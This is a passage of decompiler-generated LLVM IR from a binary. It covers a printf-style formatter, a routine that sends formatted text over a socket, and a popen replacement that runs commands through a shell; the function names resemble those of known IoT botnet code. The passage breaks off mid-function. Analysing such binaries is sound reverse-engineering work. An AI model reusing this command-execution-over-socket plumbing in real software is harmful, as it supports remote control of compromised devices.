  %stack_var_-28.4.in34 = phi i32 [ %arg2, %dec_label_pc_8908.lr.ph ], [ %v1_8c88, %dec_label_pc_8c84 ]
  %stack_var_-32.133 = phi i32 [ %arg3, %dec_label_pc_8908.lr.ph ], [ %stack_var_-32.0, %dec_label_pc_8c84 ]
  %stack_var_-40.132 = phi i32 [ 0, %dec_label_pc_8908.lr.ph ], [ %stack_var_-40.0, %dec_label_pc_8c84 ]
  %v2_890c = load i8, i8* %stack_var_-28.435, align 1
  %v7_8910 = icmp eq i8 %v2_890c, 37
  br i1 %v7_8910, label %dec_label_pc_8918, label %dec_label_pc_8c64

dec_label_pc_8918:                                ; preds = %dec_label_pc_8908
  %v1_891c = add i32 %stack_var_-28.4.in34, 1
  %v5_8920 = inttoptr i32 %v1_891c to i8*
  %v2_8938 = load i8, i8* %v5_8920, align 1
  %v2_893c = icmp eq i8 %v2_8938, 0
  br i1 %v2_893c, label %dec_label_pc_8ca0, label %dec_label_pc_8944

dec_label_pc_8944:                                ; preds = %dec_label_pc_8918
  %v2_8948 = load i8, i8* %v5_8920, align 1
  %v7_894c = icmp eq i8 %v2_8948, 37
  br i1 %v7_894c, label %dec_label_pc_8c64, label %dec_label_pc_8954

dec_label_pc_8954:                                ; preds = %dec_label_pc_8944
  %v2_8958 = load i8, i8* %v5_8920, align 1
  %v7_895c = icmp eq i8 %v2_8958, 45
  br i1 %v7_895c, label %dec_label_pc_8964, label %dec_label_pc_8994.preheader

dec_label_pc_8964:                                ; preds = %dec_label_pc_8954
  %v1_8968 = add i32 %stack_var_-28.4.in34, 2
  %v5_896c = inttoptr i32 %v1_8968 to i8*
  br label %dec_label_pc_8994.preheader

dec_label_pc_8994.preheader:                      ; preds = %dec_label_pc_8964, %dec_label_pc_8954
  %stack_var_-28.0.ph = phi i8* [ %v5_8920, %dec_label_pc_8954 ], [ %v5_896c, %dec_label_pc_8964 ]
  %stack_var_-44.0.ph = phi i32 [ 0, %dec_label_pc_8954 ], [ 1, %dec_label_pc_8964 ]
  %v4_89942 = ptrtoint i8* %stack_var_-28.0.ph to i32
  %v2_89983 = load i8, i8* %stack_var_-28.0.ph, align 1
  %v7_899c7 = icmp eq i8 %v2_89983, 48
  br i1 %v7_899c7, label %dec_label_pc_897c, label %dec_label_pc_89e0.preheader

dec_label_pc_897c:                                ; preds = %dec_label_pc_8994.preheader, %dec_label_pc_897c
  %v4_89949 = phi i32 [ %v1_8980, %dec_label_pc_897c ], [ %v4_89942, %dec_label_pc_8994.preheader ]
  %stack_var_-44.08 = phi i32 [ %v1_898c, %dec_label_pc_897c ], [ %stack_var_-44.0.ph, %dec_label_pc_8994.preheader ]
  %v1_8980 = add i32 %v4_89949, 1
  %v5_8984 = inttoptr i32 %v1_8980 to i8*
  %v1_898c = or i32 %stack_var_-44.08, 2
  %v2_8998 = load i8, i8* %v5_8984, align 1
  %v7_899c = icmp eq i8 %v2_8998, 48
  br i1 %v7_899c, label %dec_label_pc_897c, label %dec_label_pc_89e0.preheader

dec_label_pc_89e0.preheader:                      ; preds = %dec_label_pc_897c, %dec_label_pc_8994.preheader
  %stack_var_-44.0.lcssa = phi i32 [ %stack_var_-44.0.ph, %dec_label_pc_8994.preheader ], [ %v1_898c, %dec_label_pc_897c ]
  %stack_var_-28.0.lcssa = phi i8* [ %stack_var_-28.0.ph, %dec_label_pc_8994.preheader ], [ %v5_8984, %dec_label_pc_897c ]
  %v4_89e011 = ptrtoint i8* %stack_var_-28.0.lcssa to i32
  %v2_89e412 = load i8, i8* %stack_var_-28.0.lcssa, align 1
  %tmp60 = icmp ult i8 %v2_89e412, 48
  br i1 %tmp60, label %dec_label_pc_8a00, label %dec_label_pc_89f0

dec_label_pc_89a8:                                ; preds = %dec_label_pc_89f0
  %v2_89b4 = mul i32 %stack_var_-48.019, 10
  %v2_89c0 = load i8, i8* %stack_var_-28.120, align 1
  %v3_89c0 = zext i8 %v2_89c0 to i32
  %v2_89c8 = add i32 %v2_89b4, -48
  %v1_89cc = add i32 %v2_89c8, %v3_89c0
  %v1_89d8 = add i32 %v4_89e021, 1
  %v5_89dc = inttoptr i32 %v1_89d8 to i8*
  %v2_89e4 = load i8, i8* %v5_89dc, align 1
  %tmp61 = icmp ult i8 %v2_89e4, 48
  br i1 %tmp61, label %dec_label_pc_8a00, label %dec_label_pc_89f0

dec_label_pc_89f0:                                ; preds = %dec_label_pc_89e0.preheader, %dec_label_pc_89a8
  %v4_89e021 = phi i32 [ %v1_89d8, %dec_label_pc_89a8 ], [ %v4_89e011, %dec_label_pc_89e0.preheader ]
  %stack_var_-28.120 = phi i8* [ %v5_89dc, %dec_label_pc_89a8 ], [ %stack_var_-28.0.lcssa, %dec_label_pc_89e0.preheader ]
  %stack_var_-48.019 = phi i32 [ %v1_89cc, %dec_label_pc_89a8 ], [ 0, %dec_label_pc_89e0.preheader ]
  %v2_89f4 = load i8, i8* %stack_var_-28.120, align 1
  %tmp62 = icmp ult i8 %v2_89f4, 58
  br i1 %tmp62, label %dec_label_pc_89a8, label %dec_label_pc_8a00

dec_label_pc_8a00:                                ; preds = %dec_label_pc_89a8, %dec_label_pc_89f0, %dec_label_pc_89e0.preheader
  %stack_var_-48.0.lcssa = phi i32 [ 0, %dec_label_pc_89e0.preheader ], [ %v1_89cc, %dec_label_pc_89a8 ], [ %stack_var_-48.019, %dec_label_pc_89f0 ]
  %stack_var_-28.1.lcssa = phi i8* [ %stack_var_-28.0.lcssa, %dec_label_pc_89e0.preheader ], [ %v5_89dc, %dec_label_pc_89a8 ], [ %stack_var_-28.120, %dec_label_pc_89f0 ]
  %v2_8a04 = load i8, i8* %stack_var_-28.1.lcssa, align 1
  %v7_8a08 = icmp eq i8 %v2_8a04, 115
  br i1 %v7_8a08, label %dec_label_pc_8a10, label %dec_label_pc_8a74

dec_label_pc_8a10:                                ; preds = %dec_label_pc_8a00
  %v1_8a14 = add i32 %stack_var_-32.133, 4
  %v1_8a20 = inttoptr i32 %stack_var_-32.133 to i32*
  %v2_8a20 = load i32, i32* %v1_8a20, align 4
  %v2_8a2c = icmp eq i32 %v2_8a20, 0
  br i1 %v2_8a2c, label %dec_label_pc_8a40, label %dec_label_pc_8a34

dec_label_pc_8a34:                                ; preds = %dec_label_pc_8a10
  %v5_8a38 = inttoptr i32 %v2_8a20 to i8*
  br label %dec_label_pc_8a48

dec_label_pc_8a40:                                ; preds = %dec_label_pc_8a10
  br label %dec_label_pc_8a48

dec_label_pc_8a48:                                ; preds = %dec_label_pc_8a34, %dec_label_pc_8a40
  %storemerge = phi i8* [ getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1b2e8.35, i32 0, i32 0), %dec_label_pc_8a40 ], [ %v5_8a38, %dec_label_pc_8a34 ]
  %v7_8a5c = call i32 @prints(i32 %tmp, i8* %storemerge, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-44.0.lcssa, i32 ptrtoint (i32* @0 to i32))
  %v2_8a68 = add i32 %v7_8a5c, %stack_var_-40.132
  br label %dec_label_pc_8c84

dec_label_pc_8a74:                                ; preds = %dec_label_pc_8a00
  %v2_8a78 = load i8, i8* %stack_var_-28.1.lcssa, align 1
  %v7_8a7c = icmp eq i8 %v2_8a78, 100
  br i1 %v7_8a7c, label %dec_label_pc_8a84, label %dec_label_pc_8ad8

dec_label_pc_8a84:                                ; preds = %dec_label_pc_8a74
  %v1_8a88 = add i32 %stack_var_-32.133, 4
  %v1_8a94 = inttoptr i32 %stack_var_-32.133 to i32*
  %v2_8a94 = load i32, i32* %v1_8a94, align 4
  %v7_8ac0 = call i32 @printi(i32 %tmp, i32 %v2_8a94, i32 10, i32 1, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-44.0.lcssa, i32 97)
  %v2_8acc = add i32 %v7_8ac0, %stack_var_-40.132
  br label %dec_label_pc_8c84

dec_label_pc_8ad8:                                ; preds = %dec_label_pc_8a74
  %v2_8adc = load i8, i8* %stack_var_-28.1.lcssa, align 1
  %v7_8ae0 = icmp eq i8 %v2_8adc, 120
  br i1 %v7_8ae0, label %dec_label_pc_8ae8, label %dec_label_pc_8b3c

dec_label_pc_8ae8:                                ; preds = %dec_label_pc_8ad8
  %v1_8aec = add i32 %stack_var_-32.133, 4
  %v1_8af8 = inttoptr i32 %stack_var_-32.133 to i32*
  %v2_8af8 = load i32, i32* %v1_8af8, align 4
  %v7_8b24 = call i32 @printi(i32 %tmp, i32 %v2_8af8, i32 16, i32 0, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-44.0.lcssa, i32 97)
  %v2_8b30 = add i32 %v7_8b24, %stack_var_-40.132
  br label %dec_label_pc_8c84

dec_label_pc_8b3c:                                ; preds = %dec_label_pc_8ad8
  %v2_8b40 = load i8, i8* %stack_var_-28.1.lcssa, align 1
  %v7_8b44 = icmp eq i8 %v2_8b40, 88
  br i1 %v7_8b44, label %dec_label_pc_8b4c, label %dec_label_pc_8ba0

dec_label_pc_8b4c:                                ; preds = %dec_label_pc_8b3c
  %v1_8b50 = add i32 %stack_var_-32.133, 4
  %v1_8b5c = inttoptr i32 %stack_var_-32.133 to i32*
  %v2_8b5c = load i32, i32* %v1_8b5c, align 4
  %v7_8b88 = call i32 @printi(i32 %tmp, i32 %v2_8b5c, i32 16, i32 0, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-44.0.lcssa, i32 65)
  %v2_8b94 = add i32 %v7_8b88, %stack_var_-40.132
  br label %dec_label_pc_8c84

dec_label_pc_8ba0:                                ; preds = %dec_label_pc_8b3c
  %v2_8ba4 = load i8, i8* %stack_var_-28.1.lcssa, align 1
  %v7_8ba8 = icmp eq i8 %v2_8ba4, 117
  br i1 %v7_8ba8, label %dec_label_pc_8bb0, label %dec_label_pc_8c04

dec_label_pc_8bb0:                                ; preds = %dec_label_pc_8ba0
  %v1_8bb4 = add i32 %stack_var_-32.133, 4
  %v1_8bc0 = inttoptr i32 %stack_var_-32.133 to i32*
  %v2_8bc0 = load i32, i32* %v1_8bc0, align 4
  %v7_8bec = call i32 @printi(i32 %tmp, i32 %v2_8bc0, i32 10, i32 0, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-44.0.lcssa, i32 97)
  %v2_8bf8 = add i32 %v7_8bec, %stack_var_-40.132
  br label %dec_label_pc_8c84

dec_label_pc_8c04:                                ; preds = %dec_label_pc_8ba0
  %v2_8c08 = load i8, i8* %stack_var_-28.1.lcssa, align 1
  %v7_8c0c = icmp eq i8 %v2_8c08, 99
  br i1 %v7_8c0c, label %dec_label_pc_8c14, label %dec_label_pc_8c84

dec_label_pc_8c14:                                ; preds = %dec_label_pc_8c04
  %v1_8c18 = add i32 %stack_var_-32.133, 4
  %v1_8c24 = inttoptr i32 %stack_var_-32.133 to i32*
  %v2_8c24 = load i32, i32* %v1_8c24, align 4
  %v1_8c28 = urem i32 %v2_8c24, 256
  store i32 %v1_8c28, i32* %stack_var_-18, align 4
  %v6_8c4c = call i32 @prints(i32 %tmp, i8* %v5_8c4c, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-44.0.lcssa, i32 %v1_8c18)
  %v2_8c58 = add i32 %v6_8c4c, %stack_var_-40.132
  br label %dec_label_pc_8c84

dec_label_pc_8c64:                                ; preds = %dec_label_pc_8908, %dec_label_pc_8944
  %stack_var_-28.2 = phi i8* [ %v5_8920, %dec_label_pc_8944 ], [ %stack_var_-28.435, %dec_label_pc_8908 ]
  %v2_8c68 = load i8, i8* %stack_var_-28.2, align 1
  %v3_8c68 = zext i8 %v2_8c68 to i32
  %v3_8c74 = call i32 @printchar(i32* %arg1, i32 %v3_8c68)
  %v1_8c7c = add i32 %stack_var_-40.132, 1
  br label %dec_label_pc_8c84

dec_label_pc_8c84:                                ; preds = %dec_label_pc_8c04, %dec_label_pc_8c14, %dec_label_pc_8bb0, %dec_label_pc_8b4c, %dec_label_pc_8ae8, %dec_label_pc_8a84, %dec_label_pc_8a48, %dec_label_pc_8c64
  %stack_var_-40.0 = phi i32 [ %v1_8c7c, %dec_label_pc_8c64 ], [ %v2_8a68, %dec_label_pc_8a48 ], [ %v2_8acc, %dec_label_pc_8a84 ], [ %v2_8b30, %dec_label_pc_8ae8 ], [ %v2_8b94, %dec_label_pc_8b4c ], [ %v2_8bf8, %dec_label_pc_8bb0 ], [ %v2_8c58, %dec_label_pc_8c14 ], [ %stack_var_-40.132, %dec_label_pc_8c04 ]
  %stack_var_-32.0 = phi i32 [ %stack_var_-32.133, %dec_label_pc_8c64 ], [ %v1_8a14, %dec_label_pc_8a48 ], [ %v1_8a88, %dec_label_pc_8a84 ], [ %v1_8aec, %dec_label_pc_8ae8 ], [ %v1_8b50, %dec_label_pc_8b4c ], [ %v1_8bb4, %dec_label_pc_8bb0 ], [ %v1_8c18, %dec_label_pc_8c14 ], [ %stack_var_-32.133, %dec_label_pc_8c04 ]
  %stack_var_-28.3 = phi i8* [ %stack_var_-28.2, %dec_label_pc_8c64 ], [ %stack_var_-28.1.lcssa, %dec_label_pc_8a48 ], [ %stack_var_-28.1.lcssa, %dec_label_pc_8a84 ], [ %stack_var_-28.1.lcssa, %dec_label_pc_8ae8 ], [ %stack_var_-28.1.lcssa, %dec_label_pc_8b4c ], [ %stack_var_-28.1.lcssa, %dec_label_pc_8bb0 ], [ %stack_var_-28.1.lcssa, %dec_label_pc_8c14 ], [ %stack_var_-28.1.lcssa, %dec_label_pc_8c04 ]
  %v4_8c84 = ptrtoint i8* %stack_var_-28.3 to i32
  %v1_8c88 = add i32 %v4_8c84, 1
  %stack_var_-28.4 = inttoptr i32 %v1_8c88 to i8*
  %v2_8c94 = load i8, i8* %stack_var_-28.4, align 1
  %v2_8c98 = icmp eq i8 %v2_8c94, 0
  br i1 %v2_8c98, label %dec_label_pc_8ca0, label %dec_label_pc_8908

dec_label_pc_8ca0:                                ; preds = %dec_label_pc_8918, %dec_label_pc_8c84, %entry
  %stack_var_-40.1.lcssa = phi i32 [ 0, %entry ], [ %stack_var_-40.132, %dec_label_pc_8918 ], [ %stack_var_-40.0, %dec_label_pc_8c84 ]
  %v2_8ca4 = icmp eq i32* %arg1, null
  br i1 %v2_8ca4, label %dec_label_pc_8cbc, label %dec_label_pc_8cac

dec_label_pc_8cac:                                ; preds = %dec_label_pc_8ca0
  %v2_8cb0 = load i32, i32* %arg1, align 4
  %v3_8cb8 = inttoptr i32 %v2_8cb0 to i8*
  store i8 0, i8* %v3_8cb8, align 1
  br label %dec_label_pc_8cbc

dec_label_pc_8cbc:                                ; preds = %dec_label_pc_8ca0, %dec_label_pc_8cac
  ret i32 %stack_var_-40.1.lcssa

; uselistorder directives
  uselistorder i8* %stack_var_-28.4, { 1, 0 }
  uselistorder i8* %stack_var_-28.1.lcssa, { 12, 11, 9, 7, 5, 3, 1, 10, 8, 6, 4, 2, 0 }
  uselistorder i32 %stack_var_-48.0.lcssa, { 1, 2, 3, 4, 5, 0 }
  uselistorder i8* %stack_var_-28.0.lcssa, { 1, 0, 2, 3 }
  uselistorder i32 %stack_var_-44.0.lcssa, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_8980, { 1, 0 }
  uselistorder i32 %stack_var_-44.0.ph, { 1, 0 }
  uselistorder i8* %v5_8920, { 2, 0, 1, 3, 4 }
  uselistorder i32 %stack_var_-40.132, { 0, 8, 7, 1, 2, 3, 4, 5, 6 }
  uselistorder i32 %stack_var_-32.133, { 13, 0, 11, 12, 9, 10, 7, 8, 5, 6, 3, 4, 1, 2 }
  uselistorder i32 %stack_var_-28.4.in34, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-18, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @printi, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i8*, i32, i32, i32)* @prints, { 0, 3, 1, 2 }
  uselistorder label %dec_label_pc_8cbc, { 1, 0 }
  uselistorder label %dec_label_pc_8ca0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8c84, { 7, 1, 0, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_8c64, { 1, 0 }
  uselistorder label %dec_label_pc_8a48, { 1, 0 }
  uselistorder label %dec_label_pc_8a00, { 1, 0, 2 }
  uselistorder label %dec_label_pc_89f0, { 1, 0 }
  uselistorder label %dec_label_pc_897c, { 1, 0 }
  uselistorder label %dec_label_pc_8908, { 1, 0 }
}

define i32 @zprintf(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v6_8cd4 = load i32, i32* @r1, align 4
  store i32 %v6_8cd4, i32* %stack_var_-12, align 4
  %v3_8cd8 = load i32, i32* @fp, align 4
  store i32 36064, i32* %stack_var_-20, align 4
  %v2_8cdc = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_8cdc, i32* @fp, align 4
  %v2_8ce4 = ptrtoint i32* %stack_var_-12 to i32
  %v4_8cfc = call i32 @print(i32* null, i32 %arg1, i32 %v2_8ce4)
  store i32 %v3_8cd8, i32* @fp, align 4
  ret i32 %v4_8cfc

; uselistorder directives
  uselistorder i32* %stack_var_-20, { 1, 0 }
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @szprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  store i32 %arg3, i32* %stack_var_-8, align 4
  %v3_8d18 = load i32, i32* @fp, align 4
  store i32 36128, i32* %stack_var_-16, align 4
  %v2_8d1c = ptrtoint i32* %stack_var_-16 to i32
  store i32 %v2_8d1c, i32* @fp, align 4
  store i32 %arg1, i32* %stack_var_-36, align 4
  %v2_8d28 = ptrtoint i32* %stack_var_-8 to i32
  %v4_8d40 = call i32 @print(i32* nonnull %stack_var_-36, i32 %arg2, i32 %v2_8d28)
  store i32 %v3_8d18, i32* @fp, align 4
  ret i32 %v4_8d40

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @sockprintf(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v6_8d58 = load i32, i32* @r2, align 4
  store i32 %v6_8d58, i32* %stack_var_-8, align 4
  %v3_8d5c = load i32, i32* @fp, align 4
  store i32 36196, i32* %stack_var_-16, align 4
  %v2_8d60 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %v2_8d60, i32* @fp, align 4
  store i32 %arg1, i32* %stack_var_-48, align 4
  %v1_8d70 = call i32 @malloc(i32 2048)
  store i32 %v1_8d70, i32* %stack_var_-40, align 4
  store i32 2048, i32* @r2, align 4
  %v2_8d8c = inttoptr i32 %v1_8d70 to i8*
  %v3_8d8c = call i32 @__GI_memset(i8* %v2_8d8c, i32 0)
  %v2_8d98 = ptrtoint i32* %stack_var_-8 to i32
  %v4_8db8 = call i32 @print(i32* nonnull %stack_var_-40, i32 %arg2, i32 %v2_8d98)
  %v3_8dc0 = call i32 @strlen(i8* %v2_8d8c)
  %v2_8dd0 = add i32 %v3_8dc0, %v1_8d70
  %v3_8dd8 = inttoptr i32 %v2_8dd0 to i8*
  store i8 10, i8* %v3_8dd8, align 1
  %v3_8de0 = call i32 @strlen(i8* %v2_8d8c)
  %v3_8de8 = load i32, i32* %stack_var_-48, align 4
  %v4_8df8 = inttoptr i32 %v1_8d70 to i32*
  %v5_8df8 = call i32 @__libc_send(i32 %v3_8de8, i32* %v4_8df8, i32 %v3_8de0, i32 16384)
  store i32 %v1_8d70, i32* @r0, align 4
  %v0_8e08 = call i32 @free()
  store i32 %v3_8d5c, i32* @fp, align 4
  ret i32 %v5_8df8

; uselistorder directives
  uselistorder i8* %v2_8d8c, { 1, 0, 2 }
  uselistorder i32 %v1_8d70, { 1, 2, 0, 3, 4 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @fdpopen(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg2 to i32
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_8e20 = load i32, i32* @fp, align 4
  store i32 36392, i32* %stack_var_-4, align 4
  %v2_8e24 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_8e24, i32* @fp, align 4
  %v2_8e38 = load i8, i8* %arg2, align 1
  %v7_8e3c = icmp eq i8 %v2_8e38, 114
  br i1 %v7_8e3c, label %dec_label_pc_8e54, label %dec_label_pc_8e44

dec_label_pc_8e44:                                ; preds = %entry
  %v2_8e48 = load i8, i8* %arg2, align 1
  %v7_8e4c = icmp eq i8 %v2_8e48, 119
  br i1 %v7_8e4c, label %dec_label_pc_8e54, label %dec_label_pc_8e68

dec_label_pc_8e54:                                ; preds = %dec_label_pc_8e44, %entry
  %v1_8e58 = add i32 %tmp, 1
  %v1_8e5c = inttoptr i32 %v1_8e58 to i8*
  %v2_8e5c = load i8, i8* %v1_8e5c, align 1
  %v2_8e60 = icmp eq i8 %v2_8e5c, 0
  br i1 %v2_8e60, label %dec_label_pc_8e74, label %dec_label_pc_8e68

dec_label_pc_8e68:                                ; preds = %dec_label_pc_8e44, %dec_label_pc_8e54
  br label %dec_label_pc_9084

dec_label_pc_8e74:                                ; preds = %dec_label_pc_8e54
  %v2_8e74 = ptrtoint i32* %stack_var_-32 to i32
  %v1_8e7c = call i32 @__GI_pipe(i32 %v2_8e74)
  %v1_8e84 = icmp slt i32 %v1_8e7c, 0
  br i1 %v1_8e84, label %dec_label_pc_8e8c, label %dec_label_pc_8e98

dec_label_pc_8e8c:                                ; preds = %dec_label_pc_8e74
  br label %dec_label_pc_9084

dec_label_pc_8e98:                                ; preds = %dec_label_pc_8e74
  %v2_8e9c = load i32, i32* @global_var_2a880.37, align 4
  %v2_8ea0 = icmp eq i32 %v2_8e9c, 0
  br i1 %v2_8ea0, label %dec_label_pc_8ea8, label %dec_label_pc_8f2c

dec_label_pc_8ea8:                                ; preds = %dec_label_pc_8e98
  %v0_8ea8 = call i32 @getdtablesize()
  %v5_8ebc = icmp sgt i32 %v0_8ea8, 0
  br i1 %v5_8ebc, label %dec_label_pc_8ecc, label %dec_label_pc_8ec0

dec_label_pc_8ec0:                                ; preds = %dec_label_pc_8ea8
  br label %dec_label_pc_9084

dec_label_pc_8ecc:                                ; preds = %dec_label_pc_8ea8
  %v3_8ed0 = mul i32 %v0_8ea8, 4
  %v1_8ed8 = call i32 @malloc(i32 %v3_8ed0)
  store i32 %v1_8ed8, i32* @global_var_2a880.37, align 4
  %v2_8ef4 = icmp eq i32 %v1_8ed8, 0
  br i1 %v2_8ef4, label %dec_label_pc_8efc, label %dec_label_pc_8f08

dec_label_pc_8efc:                                ; preds = %dec_label_pc_8ecc
  br label %dec_label_pc_9084

dec_label_pc_8f08:                                ; preds = %dec_label_pc_8ecc
  store i32 %v3_8ed0, i32* @r2, align 4
  %v2_8f28 = inttoptr i32 %v1_8ed8 to i8*
  %v3_8f28 = call i32 @__GI_memset(i8* %v2_8f28, i32 0)
  br label %dec_label_pc_8f2c

dec_label_pc_8f2c:                                ; preds = %dec_label_pc_8e98, %dec_label_pc_8f08
  %v0_8f2c = call i32 @__vfork()
  %v7_8f44 = icmp eq i32 %v0_8f2c, -1
  br i1 %v7_8f44, label %dec_label_pc_8f5c, label %dec_label_pc_8f4c

dec_label_pc_8f4c:                                ; preds = %dec_label_pc_8f2c
  %v2_8f50 = icmp eq i32 %v0_8f2c, 0
  %v2_8f84 = load i8, i8* %arg2, align 1
  %v7_8f88 = icmp eq i8 %v2_8f84, 114
  br i1 %v2_8f50, label %dec_label_pc_8f80, label %dec_label_pc_9020

dec_label_pc_8f5c:                                ; preds = %dec_label_pc_8f2c
  %v3_8f5c = load i32, i32* %stack_var_-32, align 4
  %v1_8f64 = call i32 @__libc_close(i32 %v3_8f5c)
  %v1_8f70 = call i32 @__libc_close(i32 %tmp4)
  br label %dec_label_pc_9084

dec_label_pc_8f80:                                ; preds = %dec_label_pc_8f4c
  br i1 %v7_8f88, label %dec_label_pc_8f90, label %dec_label_pc_8fc8

dec_label_pc_8f90:                                ; preds = %dec_label_pc_8f80
  %v7_8f94 = icmp eq i32 %tmp4, 1
  br i1 %v7_8f94, label %dec_label_pc_8fb8, label %dec_label_pc_8f9c

dec_label_pc_8f9c:                                ; preds = %dec_label_pc_8f90
  %v0_8fa8 = call i32 @dup2()
  %v1_8fb4 = call i32 @__libc_close(i32 %tmp4)
  br label %dec_label_pc_8fb8

dec_label_pc_8fb8:                                ; preds = %dec_label_pc_8f90, %dec_label_pc_8f9c
  %v3_8fb8 = load i32, i32* %stack_var_-32, align 4
  %v1_8fc0 = call i32 @__libc_close(i32 %v3_8fb8)
  br label %dec_label_pc_8ffc

dec_label_pc_8fc8:                                ; preds = %dec_label_pc_8f80
  %v3_8fc8 = load i32, i32* %stack_var_-32, align 4
  %v2_8fcc = icmp eq i32 %v3_8fc8, 0
  br i1 %v2_8fcc, label %dec_label_pc_8ff0, label %dec_label_pc_8fd4

dec_label_pc_8fd4:                                ; preds = %dec_label_pc_8fc8
  %v0_8fe0 = call i32 @dup2()
  %v3_8fe4 = load i32, i32* %stack_var_-32, align 4
  %v1_8fec = call i32 @__libc_close(i32 %v3_8fe4)
  br label %dec_label_pc_8ff0

dec_label_pc_8ff0:                                ; preds = %dec_label_pc_8fc8, %dec_label_pc_8fd4
  %v1_8ff8 = call i32 @__libc_close(i32 %tmp4)
  br label %dec_label_pc_8ffc

dec_label_pc_8ffc:                                ; preds = %dec_label_pc_8fb8, %dec_label_pc_8ff0
  store i32 ptrtoint ([8 x i8]* @global_var_1b2f0.39 to i32), i32* @r0, align 4
  %v8_9014 = call i32 @execl(i32 ptrtoint ([8 x i8]* @global_var_1b2f0.39 to i32), i32 ptrtoint ([3 x i8]* @global_var_1af38.41 to i32), i32 ptrtoint ([3 x i8]* @global_var_1b2f8.43 to i32), i32 %arg1, i32 0)
  %v1_901c = call i32 @__GI__exit(i32 127)
  unreachable

dec_label_pc_9020:                                ; preds = %dec_label_pc_8f4c
  br i1 %v7_8f88, label %dec_label_pc_9030, label %dec_label_pc_9048

dec_label_pc_9030:                                ; preds = %dec_label_pc_9020
  %v3_9030 = load i32, i32* %stack_var_-32, align 4
  %v1_9040 = call i32 @__libc_close(i32 %tmp4)
  br label %dec_label_pc_905c

dec_label_pc_9048:                                ; preds = %dec_label_pc_9020
  %v3_9050 = load i32, i32* %stack_var_-32, align 4
  %v1_9058 = call i32 @__libc_close(i32 %v3_9050)
  br label %dec_label_pc_905c

dec_label_pc_905c:                                ; preds = %dec_label_pc_9030, %dec_label_pc_9048
  %stack_var_-40.0 = phi i32 [ %v3_9030, %dec_label_pc_9030 ], [ %tmp4, %dec_label_pc_9048 ]
  %v3_9060 = mul i32 %stack_var_-40.0, 4
  %v2_906c = load i32, i32* @global_var_2a880.37, align 4
  %v2_9070 = add i32 %v2_906c, %v3_9060
  %v2_9078 = inttoptr i32 %v2_9070 to i32*
  store i32 %v0_8f2c, i32* %v2_9078, align 4
  br label %dec_label_pc_9084

dec_label_pc_9084:                                ; preds = %dec_label_pc_8f5c, %dec_label_pc_8efc, %dec_label_pc_8ec0, %dec_label_pc_8e8c, %dec_label_pc_8e68, %dec_label_pc_905c
  %stack_var_-44.0 = phi i32 [ -1, %dec_label_pc_8e8c ], [ -1, %dec_label_pc_8efc ], [ -1, %dec_label_pc_8f5c ], [ %stack_var_-40.0, %dec_label_pc_905c ], [ -1, %dec_label_pc_8ec0 ], [ -1, %dec_label_pc_8e68 ]
  store i32 %v3_8e20, i32* @fp, align 4
  ret i32 %stack_var_-44.0

; uselistorder directives
  uselistorder i32 %stack_var_-40.0, { 1, 0 }
  uselistorder i32 %v0_8f2c, { 1, 2, 0 }
  uselistorder i32 %v3_8ed0, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %tmp4, { 0, 5, 4, 3, 2, 1 }
  uselistorder i8* %arg2, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_9084, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_905c, { 1, 0 }
  uselistorder label %dec_label_pc_8ffc, { 1, 0 }
  uselistorder label %dec_label_pc_8ff0, { 1, 0 }
  uselistorder label %dec_label_pc_8fb8, { 1, 0 }
  uselistorder label %dec_label_pc_8f2c, { 1, 0 }
  uselistorder label %dec_label_pc_8e68, { 1, 0 }
}

define i32 @fdpclose(i32 %arg1) local_unnamed_addr {
entry:
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-280 = alloca i32, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-276 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_90a4 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_90a4, i32* @ip, align 4
  %v2_90bc = load i32, i32* @global_var_2a880.37, align 4
  %v2_90c0 = icmp eq i32 %v2_90bc, 0
  br i1 %v2_90c0, label %dec_label_pc_9214, label %dec_label_pc_90c8

dec_label_pc_90c8:                                ; preds = %entry
  %v3_90cc = mul i32 %arg1, 4
  %v2_90dc = add i32 %v2_90bc, %v3_90cc
  %v1_90e0 = inttoptr i32 %v2_90dc to i32*
  %v2_90e0 = load i32, i32* %v1_90e0, align 4
